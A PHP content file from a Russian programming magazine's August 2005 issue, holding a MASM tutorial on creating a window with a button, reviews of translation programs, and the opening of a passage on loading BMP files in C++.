<?php


$site['page']['block_number_mag'] = '<div class="block_menu"><div class="text">
<h4>Август 2005</h4>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/asm.html">АСМ для новичков</a><br>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/belazar.html">Языковой барьер</a><br>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/paint.html">Простые растровые операции</a><br>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/bwt.html">BWT-кодинг</a><br>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/helloworld.html">Hello World</a><br>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/dllfunctions.html">Функции DLL</a><br>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/antikeylogger.html">Охота за шпионом (АнтиКейлоггер)</a><br>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/protection.html">Практика создания защиты</a><br>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/0805/surfaces.html">Создание поверхностей</a><br>
<div class=hr>&nbsp;</div>
	&nbsp;&raquo;&nbsp;<a href="'. $site['setting']['base'] .'/main/archive.html#0805offline">Off-line версия (архив)</a><br>
</div></div>';

switch ($site['page']['url']) {

case '0805/index.html':
	$site['page']['title'] .= ' - Август 2005';
	$site['page']['description'] .= ' Август 2005';
	$site['page']['body'] = '<h1>Август 2005</h1>
<div class="block_menu"><div class="text">
<h2>Содержание</h2>
<ul>
<li><a href="'. $site['setting']['base'] .'/0805/asm.html">АСМ для новичков</a></li>
<li><a href="'. $site['setting']['base'] .'/0805/belazar.html">Языковой барьер</a></li>
<li><a href="'. $site['setting']['base'] .'/0805/paint.html">Простые растровые операции</a></li>
<li><a href="'. $site['setting']['base'] .'/0805/bwt.html">BWT-кодинг</a></li>
<li><a href="'. $site['setting']['base'] .'/0805/helloworld.html">Hello World</a></li>
<li><a href="'. $site['setting']['base'] .'/0805/dllfunctions.html">Функции DLL</a></li>
<li><a href="'. $site['setting']['base'] .'/0805/antikeylogger.html">Охота за шпионом, или АнтиКейлоггер</a></li>
<li><a href="'. $site['setting']['base'] .'/0805/protection.html">Практика создания защиты</a></li>
<li><a href="'. $site['setting']['base'] .'/0805/surfaces.html">Создание поверхностей</a></li>
</ul>
</div></div>
';
	break;
//-------------------------------------------------------------------------------------------------------
//             /img/m/0805/
case '0805/asm.html':
	$site['page']['title'] .= ' - АСМ для новичков';
	$site['page']['description'] .= ' АСМ для новичков';
	$site['page']['body'] = '<h1></h1>
<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=9761"><i>miksayer</i></a>

<p>Вот и пришло время для второй статьи цикла "Изучаем Ассемблер". В прошлой статье мы познакомились только с основами ассемблера. Теперь мы создадим окно, поместим на него кнопку и отловим нажатие на нее. Итак, начнем!</p>

<h2>Создаем окно</h2>
<p>Для начала нам нужно создать пустое окно. Для этого мы будем использовать API-функцию CreateWindowEx. Вот код:</p>
<pre class="code">
.386
     .model flat,stdcall
     option casemap:none
     ; Подключаем необходимые библиотеки и описания их структур и функций
     include windows.inc
     include user32.inc
     include kernel32.inc
     include gdi32.inc
     include comdlg32.inc
     includelib user32.lib
     includelib kernel32.lib
     includelib gdi32.lib
     includelib comdlg32.lib
WinMain proto :DWORD,:DWORD,:DWORD,:DWORD  ; описываем прототип функции
; Макрос, заносящий значения компонент палитры в регистр EAX
RGB macro red,green,blue
         mov     eax,blue shl 16 + green shl 8 + red
endm
; Макрос для вставки текста
szText MACRO Name,Text:VARARG
        .data
    Name     db Text,0
        .code
endm
.const
button1ID    equ 1
.data?
hwndbutton1  HWND ?
hInstance    HINSTANCE ?
CommandLine  LPSTR ?
.data
Textbutton1  db "Button1",0
;_______________
ClassName    db "MASM Builder",0
BtnClName    db "button",0
StatClName   db "static",0
EditClName   db "edit",0
LboxClName   db "listbox",0
CboxClName   db "combobox",0
ReditClName  db "richedit",0
RichEditLib  db "riched32.dll",0
Caption      db "Form",0
;_______________
.code
start:
         ; Получаем описатель нашего модуля
     invoke   GetModuleHandle,NULL
     mov      hInstance,eax
     ; Получаем адрес командной строки
     invoke   GetCommandLine
     ; Вызываем главную процедуру в стиле C++
     invoke   WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT
     ; Завершаем процесс
     invoke   ExitProcess,eax
; Главная процедура в стиле C++
WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD
LOCAL   wc  :WNDCLASSEX
LOCAL   msg     :MSG
LOCAL   hwnd    :HWND
         ; Заполняем структуру WNDCLASSEX, хранящую информацию о создаваемом классе окон
     mov      wc.cbSize,SIZEOF WNDCLASSEX  ; размер структуры
     mov      wc.style,CS_HREDRAW or CS_VREDRAW  ; стиль окна
     mov      wc.lpfnWndProc,OFFSET WndProc  ; адрес процедуры обработки сообщений
     mov      wc.cbClsExtra,NULL  ; кол-во дополнительных байт за структурой класса (0)
     mov      wc.cbWndExtra,NULL  ; кол-во дополнительных байт за экземпляром окна (0)
     push     hInst
     pop      wc.hInstance  ; описатель экземпляра процесса с процедурой обработки сообщений
     RGB      235,233,216  ; EAX = код серо-бежевого цвета
     invoke   CreateSolidBrush,eax  ; создаём кисть заполнения однородным цветом EAX
     mov      wc.hbrBackground,eax  ; кисть для заполнения фона (серо-
бежевым цветом)
     mov      wc.lpszClassName,OFFSET ClassName  ; имя класса
     invoke   LoadIcon,NULL,IDI_APPLICATION  ; загружаем стандартную иконку приложения
     mov      wc.hIcon,eax  ; большая иконка приложения
     mov      wc.hIconSm,eax  ; маленькая иконка приложения
     invoke   LoadCursor,NULL,IDC_ARROW  ; загружаем стандартный курсор
     mov      wc.hCursor,eax  ; курсор мыши в области окна
     mov      wc.lpszMenuName,NULL  ; имя или идентификатор меню (0)
     ; Регистрируем класс и создаём окно
     invoke   RegisterClassEx,addr wc
     invoke   CreateWindowEx,0,ADDR ClassName,ADDR Caption,WS_SYSMENU or WS_SIZEBOX,389,82,327,200,0,0,hInst,0
     ; Показываем окно
     mov      hwnd,eax
     INVOKE   ShowWindow,hwnd,SW_SHOWNORMAL
     INVOKE   UpdateWindow,hwnd
     ; Цикл обработки сообщений (стандартный)
     .WHILE TRUE
         INVOKE   GetMessage,ADDR msg,0,0,0  ; ожидаем и получаем сообщение
         .BREAK .IF (!eax)                   ; выходим из цикла, если получаем WM_QUIT (выход из приложения)
         INVOKE   TranslateMessage,ADDR msg  ; преобразуем символьные сообщения
         INVOKE   DispatchMessage,ADDR msg   ; обрабатываем сообщение
     .ENDW
     mov      eax,msg.wParam
     ret
WinMain endp
; Процедура обработки сообщений
WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM
     .IF uMsg == WM_DESTROY  ; сообщение об уничтожении окна (передаётся во время закрытия окна)
         invoke   PostQuitMessage,NULL  ; отправляем в очередь сообщение WM_QUIT
     .ELSEIF uMsg == WM_CREATE  ; сообщение о создании окна (передаётся после создания окна)
             ; создаём кнопку с идентификатором = button1ID (кнопка - это тоже окно)
         invoke  CreateWindowEx,0,ADDR BtnClName,ADDR Textbutton1,WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON,114,71,75,25,hWnd,button1ID,hInstance,0

         mov      hwndbutton1,eax  ; сохраняем описатель кнопки
     .ELSEIF uMsg == WM_COMMAND  ; сообщение о команде (например, нажатии на кнопку)
         mov     eax,wParam
         .IF lParam != 0  ; описатель контрола (равен нулю, если это НЕ контрол формы)
            .IF ax == button1ID  ; младшее слово wParam определяет идентификатор контрола
                 shr eax,16
                 .IF ax == BN_CLICKED  ; старшее слово wParam определяет код команды
                         ; Выводим на экран сообщение
                     invoke   MessageBox,hWnd,addr Textbutton1,NULL,MB_ICONINFORMATION
                 .ENDIF
             .ENDIF
         .ENDIF;
     .ELSE  ; другое сообщение
             ; Вызываем стандартный обработчик сообщения
         invoke   DefWindowProc,hWnd,uMsg,wParam,lParam
         ret
     .ENDIF
     xor     eax,eax  ; сообщение обработано
     ret
WndProc endp
end start                              ; Конец программы с указанием точки в
</pre>

<p>В коде вы видите несколько новых конструкций .WHILE ... .ENDW и .IF ... .ELSE ... .ENDIF. Если вы раньше изучали какой-либо язык программирования, то понять смысл этих конструкций вам не составит большого труда, иначе давайте разберем, например, такую конструкцию из нашего кода:</p>
<pre class="code">
	 .IF uMsg == WM_DESTROY
		 invoke   PostQuitMessage,NULL
	 .ELSEIF uMsg == WM_CREATE
	 .ELSE
		 invoke   DefWindowProc,hWnd,uMsg,wParam,lParam
		 ret
	 .ENDIF
</pre>

<p>Этот код означает, что если нашему окну послано сообщение WM_DESTROY(.IF), то мы выполняем API-функцию PostQuitMessage, если сообщение WM_CREATE(.ELSEIF), то ничего не делаем, а во всех остальных случаях(.ELSE) вызываем функцию DefWindowProc. Теперь давайте вернемся к нашей кнопке. Создавать мы ее будем с помощью такого кода:</p>
<pre class="code">
invoke CreateWindowEx,0,ADDR BtnClName,ADDR Textbutton1,WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON,114,71,75,25,hWnd,button1ID,hInstance,0
mov 	  hwndbutton1,EAX
</pre>

<p>Теперь в переменной hwndbutton1 хранится хэндл нашей кнопки. Не забудьте объявить переменную hwndbutton1 в секции .data? так:</p>
<pre class="code">
hwndbutton1	 HWND ?
</pre>

<p>и button1ID в .const так:</p>
<pre class="code">
button1ID	 equ 1
</pre>

<p>Теперь нам нужно добавить такой код вместо нашей конструкции <font color="#ff0000">.IF ... .ELSE ... .ENDIF</font>:</p>
<pre class="code">
	 <font color="#0000ff">.IF</font> uMsg == WM_DESTROY
		 invoke   PostQuitMessage,NULL
	 <font color="#0000ff">.ELSEIF</font> uMsg == WM_CREATE
invoke CreateWindowEx,0,ADDR BtnClName,ADDR Textbutton1,WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON,114,71,75,25,hWnd,button1ID,hInstance,0
		 mov 	  hwndbutton1,EAX
	 <font color="#0000ff">.ELSEIF</font> uMsg == WM_COMMAND
		 mov 	 eax,wParam
		 <font color="#0000ff">.IF</font> lParam != 0
			 <font color="#0000ff">.IF</font> ax == button1ID
				 shr eax,16
				 <font color="#0000ff">.IF</font> ax == BN_CLICKED
					 invoke 	MessageBox,hWnd,addr Textbutton1,0,MB_ICONINFORMATION
				 <font color="#0000ff">.ENDIF</font>
			 <font color="#0000ff">.ENDIF</font>
		 <font color="#0000ff">.ENDIF;</font>
	 <font color="#0000ff">.ELSE</font>
		 invoke   DefWindowProc,hWnd,uMsg,wParam,lParam
		 ret
	 <font color="#0000ff">.ENDIF</font>
</pre>

<p>Здесь мы отлавливаем событие WM_COMMAND и проверяем, не было ли оно передано нашей кнопке, далее проверяем, какое это событие (нам нужно BN_CLICKED), и, если это оно, выкидываем сообщение с текстом из переменной Textbutton1, которую объявляем в секции <font color="#ff0000">.data</font>:</p>
<pre class="code">
Textbutton1	 db "Button1",0
</pre>

<p>Все! Наша программа готова. Если что-то непонятно, то я привожу полный код нашей программы:</p>
<pre class="code">
<font color="#ff0000">.386</font>
	 <font color="#ff0000">.model flat,stdcall</font>
	 option casemap:none
	 include \masm32\include\windows.inc
	 include \masm32\include\user32.inc
	 include \masm32\include\kernel32.inc
	 include \masm32\include\gdi32.inc
	 include \masm32\include\comdlg32.inc
	 includelib \masm32\lib\user32.lib
	 includelib \masm32\lib\kernel32.lib
	 includelib \masm32\lib\gdi32.lib
	 includelib \masm32\lib\comdlg32.lib
WinMain proto :DWORD,:DWORD,:DWORD,:DWORD
RGB macro red,green,blue
	 xor 	 eax,eax
	 mov 	 ah,blue
	 shl 	 eax,8
	 mov 	 ah,green
	 mov 	 al,red
endm
szText MACRO Name,Text:VARARG
	LOCAL	 lbl
	jmp	 lbl
	Name	 db Text,0
	lbl:
ENDM
<font color="#ff0000">.const</font>
button1ID	 equ 1
<font color="#ff0000">.data?</font>
hwndbutton1	 HWND ?
hInstance	 HINSTANCE ?
CommandLine	 LPSTR ?
<font color="#ff0000">.data</font>
Textbutton1	 db "Button1",0
;_______________
ClassName	 db "MASM Builder",0
BtnClName	 db "button",0
StatClName	 db "static",0
EditClName	 db "edit",0
LboxClName	 db "listbox",0
CboxClName	 db "combobox",0
ReditClName	 db "richedit",0
RichEditLib	 db "riched32.dll",0
Caption		 db "Form",0
;_______________
<font color="#ff0000">.code</font>
start:
	 invoke   GetModuleHandle,NULL
	 mov      hInstance,eax
	 invoke   GetCommandLine
	 invoke   WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT
	 invoke   ExitProcess,eax
WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD
LOCAL 	wc 	:WNDCLASSEX
LOCAL 	msg 	:MSG
LOCAL 	hwnd	:HWND
	 mov      wc.cbSize,SIZEOF WNDCLASSEX
	 mov      wc.style,CS_HREDRAW or CS_VREDRAW
	 mov      wc.lpfnWndProc,OFFSET WndProc
	 mov      wc.cbClsExtra,NULL
	 mov      wc.cbWndExtra,NULL
	 push     hInst
	 pop      wc.hInstance
	 RGB      235,233,216
	 invoke   CreateSolidBrush,eax
	 mov      wc.hbrBackground,eax
	 mov      wc.lpszClassName,OFFSET ClassName
	 invoke   LoadIcon,NULL,IDI_APPLICATION
	 mov      wc.hIcon,eax
	 mov      wc.hIconSm,eax
	 invoke   LoadCursor,NULL,IDC_ARROW
	 mov      wc.hCursor,eax
	 invoke   RegisterClassEx,addr wc
invoke CreateWindowEx,0,ADDR ClassName,ADDR Caption,WS_SYSMENU or WS_SIZEBOX,389,82,327,200,0,0,hInst,0
	 mov      hwnd,eax
	 INVOKE   ShowWindow,hwnd,SW_SHOWNORMAL
	 INVOKE   UpdateWindow,hwnd
	 <font color="#0000ff">.WHILE</font> TRUE
		 INVOKE   GetMessage,ADDR msg,0,0,0
		 <font color="#0000ff">.BREAK .IF</font> (!eax)
		 INVOKE   TranslateMessage,ADDR msg
		 INVOKE   DispatchMessage,ADDR msg
	 <font color="#0000ff">.ENDW</font>
	 mov      eax,msg.wParam
	 ret
WinMain endp
WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM
	 <font color="#0000ff">.IF</font> uMsg == WM_DESTROY
		 invoke   PostQuitMessage,NULL
	 <font color="#0000ff">.ELSEIF</font> uMsg == WM_CREATE
invoke CreateWindowEx,0,ADDR BtnClName,ADDR Textbutton1,WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON,114,71,75,25,hWnd,button1ID,hInstance,0
		 mov 	  hwndbutton1,EAX
	 <font color="#0000ff">.ELSEIF</font> uMsg == WM_COMMAND
		 mov 	 eax,wParam
		 <font color="#0000ff">.IF</font> lParam != 0
			 <font color="#0000ff">.IF</font> ax == button1ID
				 shr eax,16
				 <font color="#0000ff">.IF</font> ax == BN_CLICKED
					 invoke 	MessageBox,hWnd,addr Textbutton1,0,MB_ICONINFORMATION
				 <font color="#0000ff">.ENDIF</font>
			 <font color="#0000ff">.ENDIF</font>
		 <font color="#0000ff">.ENDIF;</font>
	 <font color="#0000ff">.ELSE</font>
		 invoke   DefWindowProc,hWnd,uMsg,wParam,lParam
		 ret
	 <font color="#0000ff">.ENDIF</font>
	 xor      eax,eax
	 ret
WndProc endp
end start
</pre>

<h2>Заключение</h2>
<p>Хочу дать вам небольшое "домашнее задание". Добавьте еще одну кнопку и по нажатию на нее эмулируйте нажатие на другую кнопку (это делается с помощью API-функции SendMessage).</p>
<p>Надеюсь, вы все поняли из этой статьи, если нет, то пишите письма на miksayer@mail.ru. Удачи!</p>
<p></p>
<p>С уважением, Miksayer!</p>
';
	break;
//-------------------------------------------------------------------------------------------------------

case '0805/belazar.html':
	$site['page']['title'] .= ' - Языковой барьер';
	$site['page']['description'] .= ' Языковой барьер';
	$site['page']['body'] = '<h1>Языковой барьер</h1>
<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=9761"><i>miksayer</i></a>

<h2>Языковой барьер</h2>
<p>Люди в современном мире начинают все больше общаться, в том числе благодаря Интернету. Между ними все чаще и чаще встает языковой барьер. Поэтому я решил рассказать о программах, помогающих общаться. В будущем планируется целый цикл статей, посвященных этой теме.</p>
<br>

<h2>Белазар</h2>
<p>Русско-белорусский переводчик Белазар стал настоящим спасением даже для тех, кто неплохо знает белорусский язык, так как затруднения при переводе могут возникнуть у каждого.</p>
<p>При первом запуске программа выдала ошибку - Белазар не обнаружил файл словаря. Оказалось, что словари нужно устанавливать отдельно. После установки словаря Белазар запустился нормально.</p>
<p>По умолчанию интерфейс программы на белорусском языке. Если вас это пугает, язык можно поменять на русский. Окно программы выглядит так:</p>
<div align="center"><a href="./belazar/main.jpg"><img border="0" width="500" height="345" alt="Белазар. Главное окно программы" title="Белазар. Главное окно программы" src="'. $site['setting']['base'] .'/img/m/0805/belazar/main.jpg"></a></div>
<p>В базе содержится 19715 белорусских слов и словосочетаний и 21341 русских (не так уж и мало, если учесть, что белорусский язык отличается от русского не сильно). Имеется  возможность добавления новых слов.</p>
<p>Доступны следующие настройки:</p>
<div align="center"><img border="0" width="423" height="333" alt="Белазар. Окно настроек программы" title="Белазар. Окно настроек программы" src="'. $site['setting']['base'] .'/img/m/0805/belazar/settings.jpg"></div>
<p>Мне, например, очень понравилась функция автоматического переключения раскладки клавиатуры на белорусскую или русскую.</p>
<p>В программе реализована функция проверки правописания, которая показывает, какие слова в тексте написаны неправильно. Но пункт меню "Исправить" почему-то не работает. Кроме того, имеется возможность конвертирования текста из одной кодировки в другую:</p>
<div align="center"><img border="0" width="394" height="170" alt="Белазар. Конвертирование текста из одной кодировки в другую" title="Белазар. Конвертирование текста из одной кодировки в другую" src="'. $site['setting']['base'] .'/img/m/0805/belazar/encode.jpg"></div>
<p>Для тестирования перевода я взял следующее предложение "Не хочешь ли чая, который я купил позавчера?". Сложность в том, что белорусский аналог частицы "ли" ("цi") должен ставиться в начале предложения. Программа выдала следующее: "Ці не жадаеш гарбаты, які я набыў заўчора?". Как видите, есть одна небольшая ошибка. В белорусском языке слово "гарбата" женского рода, а слово "чай" в русском - мужского. И поэтому слово "якi" в переводе оказалось тоже мужского рода. Мелочь, конечно, но неприятно. Зато со словом "цi" программа справилась отлично. А вот при переводе с белорусского языка на русский проблем больше. Я взял то же самое выражение на белорусском языке. После перевода Белазар выдал такой текст: "Не алкаешь ли чая, какой я приобрел позавчера?". Конечно, глагол "алкать" подходит по смыслу, но более распространенный все-таки "хотеть".</p>
<p>В общем, несмотря на некоторые недоработки, программа неплохая.</p>
<p>Оценки:</p><br>
<table border="0" width="400" cellspacing="0" cellpadding="5">
 <tr>
  <td width="35%" class="c2"><b>Удобство:</b></td>
  <td width="65%" class="c1">8/10</p>
 </tr>
 <tr>
  <td width="35%" class="c2"><b>Качество перевода:</b></td>
  <td width="65%" class="c1">6/10</p>
 </tr>
 <tr>
  <td width="35%" class="c2"><b>Официальный сайт:</b></td>
  <td width="65%" class="c1"><noindex><a href="http://belazar.belinter.net/" rel="nofollow" target="_blank">http://belazar.belinter.net/</a></noindex></td>
 </tr>
</table>
<br>

<h2>ABBYY Lingvo 10 First Step</h2>
<p>Эта не переводчик, а словарь, но какой словарь! В настоящий момент, насколько мне известно, программа имеет английский, немецкий, французский, итальянский и испанский словари. У меня в руках оказались английский и немецкий. Кроме словарей общей лексики, имеются и специализированные. Например, англо-русские: юридический, экономический, компьютерный, политехнический, медицинский и грамматический.</p>
<p>У Lingvo хороший и интуитивно понятный интерфейс. Нет ничего лишнего:</p>
<div align="center"><img border="0" width="290" height="370" alt="ABBYY Lingvo" title="ABBYY Lingvo" src="'. $site['setting']['base'] .'/img/m/0805/belazar/lingvo.jpg"></div>
<p>После нажатия на кнопку "Перевести" появляется такое окошко:</p>
<div align="center"><img border="0" width="390" height="615" alt="ABBYY Lingvo. Окно перевода" title="ABBYY Lingvo. Окно перевода" src="'. $site['setting']['base'] .'/img/m/0805/belazar/card.jpg"></div>
<p>Здесь можно увидеть все варианты перевода слова или словосочетания, примеры его использования, синонимы. Если слово широко используемое, то рядом с транскрипцией появляется кнопка, с помощью которой можно его услышать. Качество произношения на очень высоком уровне. Если нужного слова Вы не нашли, словарь можно легко пополнить. Для этого нужно зайти в меню Сервис->Создать/Редактировать карточку... и указать там возможные варианты перевода. Можно отредактировать уже существующую карточку или создать свой собственный словарь.</p>
<p>С помощью сочетаний клавиш Ctrl+C+C или Ctrl+Ins+Ins можно переводить слова из других приложений, например, приложений MS Office и некоторых интернет-браузеров. Кстати, у программы есть онлайн-версия (<noindex>http://www.lingvo.yandex.ru</noindex>), которая ничуть не уступает самой программе.</p>
<p>Lingvo просто незаменима для тех, кто не любит пользоваться бумажным словарем. Недостатков, на мой взгляд, не имеет. Поэтому такая высокая оценка.</p><br>

<table border="0" width="400" cellspacing="0" cellpadding="5">
 <tr>
  <td width="35%" class="c2"><b>Удобство:</b></td>
  <td width="65%" class="c1">10/10</p>
 </tr>
 <tr>
  <td width="35%" class="c2"><b>Качество перевода:</b></td>
  <td width="65%" class="c1">-</p>
 </tr>
 <tr>
  <td width="35%" class="c2"><b>Официальный сайт:</b></td>
  <td width="65%" class="c1"><noindex><a href="http://www.lingvo.ru/" rel="nofollow" target="_blank">http://www.lingvo.ru/</a></noindex></td>
 </tr>
</table>
<br>

<h2>Promt XT Office</h2>
<p>Promt - один из самых популярных пакетов программ для перевода. Направлений перевода достаточно много: английский<->русский, немецкий<->русский, французский<->русский, испанский->русский и итальянский->русский. В пакет входит несколько программ, но для тестирования я взял только PromtX, отличающуюся простотой интерфейса.</p>
<p>При первой загрузке я увидел следующее:</p>
<div align="center"><a href="./belazar/promt.jpg"><img border="0" width="500" height="333" alt="Promt XT Office" title="Promt XT Office" src="'. $site['setting']['base'] .'/img/m/0805/belazar/promt.jpg"></a></div>
<p>Окно программы разделено на две части. В верхней части вводится то, что нужно перевести, а в нижней после нажатия на кнопку появляется перевод. Имеются тематические словари, их не так много, как в Lingvo, но мне вполне хватает. Реализована хорошая функция "Синхронный перевод": текст переводится сразу во время ввода. Любое слово можно услышать, но нормального произношения не получится, так как используются установленные на Вашем компьютере голосовые движки. Для тестирования перевода я взял все то же предложение "Не хочешь ли чая, который я купил позавчера?". Результат был такой: "Whether you want some tea which I have bought the day before yesterday?". Откуда здесь взялось Past Perfect, не говоря уже о множестве других ошибок? А вот с англо-русским переводом дела получше. Я взял более верный, на мой взгляд, вариант перевода: "Would you like the tea I bought the day before yesterday?". Программа выдала следующее: "Хотели бы Вы чай, который я купил позавчера?". И крайне не порадовала скорость перевода, даже одно предложение всего из нескольких слов переводится пару секунд.</p>
<p>Сама программа неплоха, хотя и имеет некоторые недостатки. Но из-за плохого русско-английского перевода ставлю только семерку. Кстати, недавно вышла версия 7.0. Судя по отзывам, в ней многое исправлено.</p>
<p>Оценки:</p><br>

<table border="0" width="400" cellspacing="0" cellpadding="5">
 <tr>
  <td width="35%" class="c2"><b>Удобство:</b></td>
  <td width="65%" class="c1">7/10</p>
 </tr>
 <tr>
  <td width="35%" class="c2"><b>Качество перевода:</b></td>
  <td width="65%" class="c1">6/10</p>
 </tr>
 <tr>
  <td width="35%" class="c2"><b>Официальный сайт:</b></td>
  <td width="65%" class="c1"><noindex><a href="http://www.promt.ru/" rel="nofollow" target="_blank">http://www.promt.ru/</a></noindex></td>
 </tr>
</table>
<br>

<h2>Pragma 3.0 (Trident Software)</h2>
<p>8,67 Мб (дополнительные словари 5.44 Мб)</p>
<p><b>Лицензия:</b> 15-дневный демонстрационный период для ознакомления с возможностями программы.  В течение этого срока может быть установлена любая конфигурация системы Pragma.</p>
<p>Pragma 3.0 представляет собой модульную систему как относительно лингвистики, так и функционирования.  Лингвистическая часть представлена  языковыми модулями: английским, русским, немецким, украинским и другими, а также расширенным словарем спецтерминов. Имеются вспомогательные модули корректировки словарей и обновления системы через Интернет или локальную сеть.</p>
<p>Pragma 3.0 представлена линейкой продуктов: Pragma Base; Pragma Lite; Pragma Internet; Pragma Office; Pragma Expert; Pragma Net.</p>
<p>В отличие от других программ-переводчиков, Pragma ориентируется не на точность, а на скорость перевода и простоту использования. Она встраивается во многие приложения Windows (MS Word, IExplorer, Outlook, WordPad, Notepad) и переводит нужный текст с помощью одного щелчка мыши.</p>
<p>После инсталляции запускаются два модуля: Pragma monitor (сидит в трее) и Pragma Bar (плавающая панель).</p>
<p><img border="0" align="left" width="262" height="170" src="'. $site['setting']['base'] .'/img/m/0805/belazar/pr1.gif" alt="Pragma. Pragma Bar" title="Pragma. Pragma Bar">На панели Pragma Bar находятся пиктограммы тех приложений, в которые программа может быть встроена. Это нововведение предназначено для облегчения запуска приложений, оно выполняет функции дополнительной панели быстрого запуска. Щелкнув по пиктограмме, Вы запустите соответствующее приложение.</p>
<p>Pragma monitor выполняет функции быстрого перевода. Чтобы перевести текст, нужно выделить его и кликнуть в трее по значку Pragma. Сразу появятся два окна. В верхнем, если необходимо, можно выбрать язык перевода и базу словаря (присутствует более ста различных тематик). После нажатия на кнопку ОК текст будет переведен, а результат появится в нижнем окне. Там же имеются кнопки: "Перевод" - если надо перевести текст на другой язык, "Копировать" - для копирования результата в буфер обмена, "Параметры" - для настройки параметров по умолчанию, "Закрыть" - для закрытия окна. Не нужно спешить воспользоваться последней кнопкой, если не закрывать окно, мы сможем оценить</p>
<div align="center"><a href="'. $site['setting']['base'] .'/img/m/0805/belazar/pr2.gif"><img border="0" width="500" height="266" src="'. $site['setting']['base'] .'/img/m/0805/belazar/pr2.gif" alt="Pragma" title="Pragma"></a></div>
<p>еще одно удобство. Окно имеет свойство "Поверх всех", поэтому любой скопированный в буфер текст автоматически будет переведен, теперь не надо ничего нажимать.</p>
<p>Во все программы, в которые встраивается Pragma, добавляется меню из трех пунктов: "Перевод" (дублируется значком в панели инструментов), "Настройка" и "О программе". Если использовать это меню, то после перевода Pragma спросит о способе сохранения результата и предложит несколько вариантов:</p>
<div align="center"><a href="'. $site['setting']['base'] .'/img/m/0805/belazar/pr3.gif"><img border="0" width="500" height="265" src="'. $site['setting']['base'] .'/img/m/0805/belazar/pr3.gif" alt="Pragma" title="Pragma"></a></div>
<p>В программе присутствует модуль корректировки словарей, можно создавать свои базы любой тематики и редактировать имеющиеся.</p>
<p>Вот и все, что касается функциональности. Все очень просто и легко, разработчики  молодцы. Это самая удобная программа среди тех, с которыми мне приходилось работать.</p>
<p>Теперь перейдем к тестам. Я взял все то же предложение "Не хочешь ли чая, который я купил позавчера?". Результат был такой: "Do not you want tea which I purchased the day before yesterday?". Для обратного перевода я взял более правильный, на мой взгляд, вариант: "Would you like the tea I bought the day before yesterday?". Программа выдала: "Разве вы хотели бы чай, я купил позавчера?". Как видите, качество оставляет желать лучшего.</p>
<p>Оценки:</p><br>

<table border="0" width="400" cellspacing="0" cellpadding="5">
 <tr>
  <td width="35%" class="c2"><b>Удобство:</b></td>
  <td width="65%" class="c1">10/10</p>
 </tr>
 <tr>
  <td width="35%" class="c2"><b>Качество перевода:</b></td>
  <td width="65%" class="c1">5/10</p>
 </tr>
 <tr>
  <td width="35%" class="c2"><b>Официальный сайт:</b></td>
  <td width="65%" class="c1"><noindex><a href="http://www.trident.com.ua/" rel="nofollow" target="_blank">http://www.trident.com.ua/</a></noindex></td>
 </tr>
</table>
<br>
';
	break;
//-------------------------------------------------------------------------------------------------------

case '0805/paint.html':
	$site['page']['title'] .= ' - Простые растровые операции';
	$site['page']['description'] .= ' Простые растровые операции';
	$site['page']['keywords'] .= ', растровые операции';
	$site['page']['body'] = '<h1>Простые растровые операции</h1>
<b>Авторы:</b> <a href="http://forum.sources.ru/index.php?showuser=10169">Мяут</a> и <a href="http://forum.sources.ru/index.php?showuser=9930">orb</a> <a href="http://vseok.org.ua/">(Сайт автора)</a>

<p>Все существующие графические объекты можно разделить на два типа: векторные и растровые.</p>

<p>Векторные объекты обычно описываются координатами и математическими формулами.</p>
<p>Самые распространенные программы для работы с объектами этого типа - Corel Draw и Adobe Illustrator.</p>
<p>Основные преимущества векторной графики:</p>
<ul>
 <li>изменение масштаба без потери качества;</li>
 <li>зависимость размера файла от количества объектов, а не от размера холста.</li>
</ul>
<p>Основной недостаток - чем больше объектов, тем больше требуется вычислительной мощности компьютера для работы с ними.</p>

<p>Растровые файлы представляют собой массив точек, для каждой из которых задается значение цвета.</p>
<p>Самые распространенные программы для работы с растровой графикой - Adobe Photoshop, Corel PhotoPaint и GIMP.</p>
<p>Основное преимущество использования растровой графики - любой объект можно перевести в растровый формат.</p>
<p>Основные недостатки:</p>
<ul>
 <li>размер файла зависит от размера холста;</li>
 <li>большой объем оперативной памяти и вычислительной мощности, необходимый для обработки растровых файлов;</li>
 <li>увеличение рисунка всегда сопровождается потерей качества.</li>
</ul>

<p>Рассмотрим изнутри работу некоторых функций и фильтров графических редакторов растровой графики.</p>
<p>Первое, что нам нужно -  это разместить файлы в памяти компьютера для того, чтобы вывести их на экран и редактировать. Работать мы будем с файлом формата BMP (Windows Bitmap), который имеет 24 бита на цвет.</p>
<p>Файл состоит из четырех разделов: заголовок файла, заголовок растра, палитра цветов (в данном примере палитры не будет) и растровые данные.</p>
<p>Нужные нам данные сохраним в структурах:</p>
<pre class="code">
LPBITMAPINFO pPicInfo; 	//заголовок растра
BYTE *pPicture;		     //растровые данные (картинка)
</pre>

<p><b>Загрузка файла:</b></p>
<pre class="code">
BOOL PicLoad(CString sFileName)	//передается имя рисунка
{
	BITMAPFILEHEADER FileHead; 	  //заголовок файла
	CFile oFile;
	if(!oFile.Open(sFileName, CFile::modeRead))
		return(FALSE);
